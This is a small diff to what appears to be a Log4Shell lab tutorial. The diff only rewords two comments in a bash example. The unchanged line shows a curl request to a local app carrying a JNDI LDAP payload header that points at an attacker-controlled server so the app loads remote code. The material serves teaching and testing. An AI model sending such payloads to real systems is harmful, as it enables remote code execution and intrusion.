@@ -47,8 +47,8 @@ After executing the previous line, the tool will give us the endpoint that the v
 Now, we just need to call the app and introduce the malicious ldap server endpoint as an [HTTP Header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
 
 ```bash
-#Notice that we are including the endpoint given by the exploitation tool. 
-#The name of the header does not matter because the app will print all the headers.
+#1. Notice that we are including the endpoint given by the exploitation tool in the previous step (vqwfzl)
+#2. The name of the header does not matter because the app will log all the headers.
 
 $ curl localhost:9090 -H 'Hack: ${jndi:ldap://192.168.86.220:1389/vqwfzl}'
 ```
